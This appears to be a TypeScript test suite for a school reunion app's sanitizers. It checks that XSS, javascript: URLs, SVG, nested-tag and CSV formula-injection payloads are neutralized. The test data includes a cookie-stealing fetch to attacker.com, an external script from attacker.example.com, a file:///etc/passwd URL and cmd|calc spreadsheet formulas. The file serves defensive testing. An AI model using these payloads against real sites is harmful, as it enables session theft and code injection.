/**
 * Police Lines High School & College, Faridpur Reunion 2027
 * Comprehensive Automated XSS & Injection Security Test Suite
 *
 * Covers OWASP Top 10 A03:2021 - Injection & CWE-79 / CWE-1236 / CWE-116
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import { JSDOM } from 'jsdom';

// Initialize DOM environment for DOMPurify inside Node test runner
const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>');
(globalThis as any).window = dom.window;
(globalThis as any).document = dom.window.document;
(globalThis as any).Node = dom.window.Node;

import {
  sanitizeInput,
  sanitizeHtml,
  sanitizeUrl,
  sanitizeImageUrl,
  sanitizeCsvCell,
  formatCsvRow,
  sanitizeSearchQuery,
  sanitizeObject,
} from './security';
import { RmsStore } from '../services/rmsStore';

// =========================================================================
// SCENARIO 1: SCRIPT INJECTION VECTORS
// =========================================================================
test('Scenario 1: Script Injection Vectors are neutralized', () => {
  const directScript = '<script>alert("XSS")</script>Sagar';
  const clean1 = sanitizeInput(directScript);
  assert.equal(clean1.includes('<script>'), false);
  assert.equal(clean1.includes('alert('), false);
  assert.equal(clean1.includes('Sagar'), true);

  // External script injection
  const externalScript = '<script src="https://attacker.example.com/exploit.js"></script>Alumni Member';
  const clean2 = sanitizeInput(externalScript);
  assert.equal(clean2.includes('<script'), false);
  assert.equal(clean2.includes('attacker.example.com'), false);
  assert.equal(clean2.includes('Alumni Member'), true);

  // Case-insensitive script tags
  const mixedCaseScript = '<sCrIpT>fetch("https://attacker.com/steal?c=" + document.cookie)</ScRiPt>Dr. Rafiq';
  const clean3 = sanitizeInput(mixedCaseScript);
  assert.equal(clean3.toLowerCase().includes('script'), false);
  assert.equal(clean3.includes('document.cookie'), false);
  assert.equal(clean3.includes('Dr. Rafiq'), true);

  // Rich HTML sanitization
  const richHtmlWithScript = '<p>Welcome <b>Batch 2005</b><script>alert(1)</script></p>';
  const cleanHtml = sanitizeHtml(richHtmlWithScript);
  assert.equal(cleanHtml.includes('<script>'), false);
  assert.equal(cleanHtml.includes('<b>Batch 2005</b>'), true);
});

// =========================================================================
// SCENARIO 2: MALICIOUS HTML & DANGEROUS TAGS
// =========================================================================
test('Scenario 2: Malicious HTML tags (img onerror, iframe, object, embed) are blocked', () => {
  // Image with onerror attribute
  const imgPayload = '<img src="invalid-image.jpg" onerror="alert(document.domain)">';
  const cleanImg = sanitizeInput(imgPayload);
  assert.equal(cleanImg.includes('onerror'), false);
  assert.equal(cleanImg.includes('&lt;img'), true);

  // Iframe injection
  const iframePayload = '<iframe src="https://malicious.example.com/phish"></iframe>';
  const cleanIframe = sanitizeHtml(iframePayload);
  assert.equal(cleanIframe.includes('<iframe'), false);

  // Object and Embed tags
  const objectPayload = '<object data="exploit.swf"></object><embed src="exploit.swf">';
  const cleanObject = sanitizeHtml(objectPayload);
  assert.equal(cleanObject.includes('<object'), false);
  assert.equal(cleanObject.includes('<embed'), false);

  // Style injection attack (CSS expression / layout hijack)
  const stylePayload = '<style>body{background:red;}</style>Normal text';
  const cleanStyle = sanitizeInput(stylePayload);
  assert.equal(cleanStyle.includes('<style>'), false);
  assert.equal(cleanStyle.includes('Normal text'), true);
});

// =========================================================================
// SCENARIO 3: INLINE EVENT HANDLER ATTRIBUTES
// =========================================================================
test('Scenario 3: Inline event handler attributes (onload, onerror, onclick, onmouseover) are stripped', () => {
  const handlers = [
    '<div onload="steal()">Hello</div>',
    '<span onmouseover="alert(\'hover\')">Hover me</span>',
    '<button onclick=\'doMalice()\'>Click</button>',
    '<input onfocus="sendTokens()" value="test" />',
    '<body ontouchstart="mobileExploit()">Content</body>',
    '<a onblur="unfocusExploit()">Link</a>',
  ];

  handlers.forEach((h) => {
    const cleanedInput = sanitizeInput(h);
    assert.equal(/on\w+\s*=/i.test(cleanedInput), false, `Failed to strip event handler in: ${h}`);

    const cleanedHtml = sanitizeHtml(h);
    assert.equal(/on\w+\s*=/i.test(cleanedHtml), false, `DOMPurify failed to strip handler in: ${h}`);
  });
});

// =========================================================================
// SCENARIO 4: PSEUDO-PROTOCOL JAVASCRIPT URLS
// =========================================================================
test('Scenario 4: Pseudo-protocol JavaScript and VBScript URLs are rejected', () => {
  const dangerousUrls = [
    'javascript:alert(document.cookie)',
    'JAVASCRIPT:alert(1)',
    '  javascript:alert(2)  ',
    'javascript:/*comment*/alert(3)',
    'vbscript:msgbox("xss")',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'file:///etc/passwd',
    'blob:https://example.com/uuid',
    'about:blank',
  ];

  dangerousUrls.forEach((url) => {
    const sanitized = sanitizeUrl(url);
    assert.equal(sanitized, '#', `Failed to reject dangerous URL: ${url}`);
  });

  // Legitimate safe URLs must pass through
  const safeUrls = [
    'https://policelines.edu.bd/reunion',
    'http://localhost:3000/tickets',
    'mailto:info@policelines.edu.bd',
    'tel:+8801711000000',
    '/admin/dashboard',
    '#events',
  ];

  safeUrls.forEach((url) => {
    const sanitized = sanitizeUrl(url);
    assert.equal(sanitized, url, `Safe URL was improperly altered: ${url}`);
  });
});

// =========================================================================
// SCENARIO 5: SVG-BASED ATTACK VECTORS
// =========================================================================
test('Scenario 5: SVG-based attack vectors and SVG data URIs are neutralized', () => {
  // SVG with inline onload
  const svgPayload = '<svg onload="alert(\'svg-xss\')"><circle r="10"/></svg>';
  const cleanSvg = sanitizeInput(svgPayload);
  assert.equal(cleanSvg.includes('onload'), false);
  assert.equal(cleanSvg.includes('&lt;svg'), true);

  // SVG with nested script tag
  const svgScript = '<svg><script>alert("nested-svg")</script></svg>';
  const cleanSvgScript = sanitizeInput(svgScript);
  assert.equal(cleanSvgScript.includes('<script>'), false);
  assert.equal(cleanSvgScript.includes('nested-svg'), false);

  // SVG Data URI in Image URL context
  const svgDataUri = 'data:image/svg+xml;utf8,<svg onload="alert(1)"></svg>';
  const safeImg = sanitizeImageUrl(svgDataUri);
  assert.equal(safeImg, '', 'SVG data URI must be rejected in image source context');

  // Valid raster image data URIs must be allowed
  const validPngDataUri = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
  const safeRasterImg = sanitizeImageUrl(validPngDataUri);
  assert.equal(safeRasterImg, validPngDataUri);
});

// =========================================================================
// SCENARIO 6: STORED XSS IN DATABASE & RMS RECORDS
// =========================================================================
test('Scenario 6: Stored XSS payloads in RMS records (Tasks, Expenses, Documents, Meetings) are sanitized before persistence', () => {
  // Create task with XSS payloads
  const maliciousTask = RmsStore.createTask({
    title: '<script>alert("task-xss")</script>Stage Lighting Checklist',
    committeeId: 'cultural-entertainment',
    committeeName: 'Cultural Committee',
    priority: 'HIGH',
    status: 'PENDING',
    description: '<img src=x onerror=alert(1)>Verify acoustic soundbars',
    assignedMemberId: 'MEM-01',
    assignedMemberName: 'Rahim <script>alert(2)</script>',
    startDate: '2027-01-10',
    deadline: '2027-01-20',
    attachments: [],
    comments: [],
    createdBy: 'USR-ADMIN',
    createdByName: 'Admin',
  });

  assert.equal(maliciousTask.title.includes('<script>'), false);
  assert.equal(maliciousTask.title.includes('Stage Lighting Checklist'), true);
  assert.equal(maliciousTask.description.includes('onerror'), false);
  assert.equal(maliciousTask.assignedMemberName?.includes('<script>'), false);

  // Upload document with javascript: fileUrl
  const maliciousDoc = RmsStore.uploadDocument({
    title: 'Seating Chart <script>alert(1)</script>',
    committeeId: 'reception-stage',
    committeeName: 'Reception Committee',
    category: 'EVENT_DESIGNS',
    accessPermission: 'PUBLIC',
    fileName: 'seating.pdf',
    fileSizeBytes: 1024,
    fileType: 'application/pdf',
    fileUrl: 'javascript:alert("doc-xss")',
    uploadedBy: 'USR-01',
    uploadedByName: 'Uploader',
  });

  assert.equal(maliciousDoc.fileUrl, '#', 'Malicious fileUrl must default to safe fallback');
  assert.equal(maliciousDoc.title.includes('<script>'), false);

  // Record expense with javascript: voucherUrl
  const maliciousExpense = RmsStore.recordExpense({
    committeeId: 'food-catering',
    committeeName: 'Food Committee',
    expenseTitle: 'Breakfast Snack Bags',
    expenseCategory: 'Food',
    amount: 15000,
    paymentMethod: 'CASH',
    vendor: 'Faridpur Sweets',
    expenseDate: '2027-01-25',
    voucherNumber: 'VOUCH-999',
    voucherUrl: 'javascript:alert("expense-xss")',
    submittedBy: 'USR-02',
    submittedByName: 'Staff User',
  });

  assert.equal(maliciousExpense.voucherUrl, '#', 'Voucher URL must be sanitized against javascript:');
});

// =========================================================================
// SCENARIO 7: DOM SINKS & SAFE URL RENDERING
// =========================================================================
test('Scenario 7: DOM Sinks (dynamic href and src attributes) are safe from script injection', () => {
  // Simulating anchor href attribute binding
  const unsafeHrefs = [
    'javascript:alert(1)',
    'jav&#x09;ascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
  ];

  unsafeHrefs.forEach((href) => {
    const safeHref = sanitizeUrl(href);
    assert.equal(safeHref.startsWith('javascript:'), false);
    assert.equal(safeHref.startsWith('data:'), false);
    assert.equal(safeHref.startsWith('vbscript:'), false);
    assert.equal(safeHref, '#');
  });

  // Simulating image src attribute binding
  const unsafeSrcs = [
    'javascript:alert(1)',
    'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+',
    'http://attacker.com/evil.php?cookie=',
  ];

  assert.equal(sanitizeImageUrl(unsafeSrcs[0]), '');
  assert.equal(sanitizeImageUrl(unsafeSrcs[1]), '');
  assert.equal(sanitizeImageUrl(unsafeSrcs[2]), unsafeSrcs[2]); // valid http endpoint permitted
});

// =========================================================================
// SCENARIO 8: CSV & SPREADSHEET FORMULA INJECTION
// =========================================================================
test('Scenario 8: CSV formula injection (OWASP CWE-1236) is prevented across exports', () => {
  const formulaPayloads = [
    "=cmd|'/C calc'!A0",
    '@SUM(1+1)*cmd|\'/C calc\'!A0',
    '+2+5+cmd|\'/C calc\'!A0',
    '-2+5+cmd|\'/C calc\'!A0',
    '\t=1+1',
    '\r=HYPERLINK("http://evil.com","Click")',
  ];

  formulaPayloads.forEach((payload) => {
    const sanitizedCell = sanitizeCsvCell(payload);
    // Must begin with quote (') to force literal interpretation in Excel / Calc / Sheets
    assert.equal(
      sanitizedCell.startsWith("'") || sanitizedCell.startsWith('"\''),
      true,
      `Formula injection was not escaped: ${payload} -> ${sanitizedCell}`
    );
  });

  // Test full CSV row formatter
  const rowData = [
    'REG-101',
    '=cmd|calc',
    'Mohammad Rahim',
    '+8801711223344',
    'SSC 2012',
    1500,
  ];

  const formattedRow = formatCsvRow(rowData);
  assert.equal(formattedRow.includes("'=cmd|calc"), true);
  assert.equal(formattedRow.includes("'+8801711223344"), true);
  assert.equal(formattedRow.includes('Mohammad Rahim'), true);
});

// =========================================================================
// SCENARIO 9: REFLECTED INPUT & SEARCH SANITIZATION
// =========================================================================
test('Scenario 9: Search query sanitization limits length and neutralizes control characters', () => {
  const maliciousSearch = '<script>alert("reflected")</script>   ';
  const cleanSearch = sanitizeSearchQuery(maliciousSearch);
  assert.equal(cleanSearch.includes('<script>'), true); // plain text search string preserved without injection
  assert.equal(cleanSearch.trim(), '<script>alert("reflected")</script>');

  // Null byte injection in search query
  const nullByteSearch = 'Student\u0000Name\u001FBatch';
  const cleanNullByte = sanitizeSearchQuery(nullByteSearch);
  assert.equal(cleanNullByte.includes('\u0000'), false);
  assert.equal(cleanNullByte.includes('\u001F'), false);
  assert.equal(cleanNullByte, 'StudentNameBatch');

  // Length limit (exceeds 100 characters)
  const excessiveQuery = 'A'.repeat(250);
  const truncated = sanitizeSearchQuery(excessiveQuery);
  assert.equal(truncated.length, 100);
});

// =========================================================================
// SCENARIO 10: MALFORMED & NESTED TAG FILTER BYPASSES
// =========================================================================
test('Scenario 10: Nested tags, malformed syntax, and recursive bypasses are defeated', () => {
  // Nested script tags: <scr<script>ipt>
  const nestedScript = '<scr<script>ipt>alert("bypass")</script>';
  const cleanNested = sanitizeInput(nestedScript);
  assert.equal(cleanNested.toLowerCase().includes('<script>'), false);
  assert.equal(cleanNested.includes('alert'), false);

  // Triple nested script tags
  const tripleNested = '<s<scr<script>ipt>ipt>alert(1)</script>';
  const cleanTriple = sanitizeInput(tripleNested);
  assert.equal(cleanTriple.toLowerCase().includes('<script>'), false);

  // Deep recursive object sanitization
  const nestedObject = {
    user: {
      name: 'Sagar <script>alert(1)</script>',
      profile: {
        bio: 'Alumni member <img src=x onerror=alert(2)>',
        tags: ['web<script>', 'security'],
      },
    },
    count: 42,
    active: true,
  };

  const sanitizedObject = sanitizeObject(nestedObject);
  assert.equal(sanitizedObject.user.name.includes('<script>'), false);
  assert.equal(sanitizedObject.user.name.includes('Sagar'), true);
  assert.equal(sanitizedObject.user.profile.bio.includes('onerror'), false);
  assert.equal(sanitizedObject.user.profile.tags[0].includes('<script>'), false);
  assert.equal(sanitizedObject.count, 42);
  assert.equal(sanitizedObject.active, true);
});
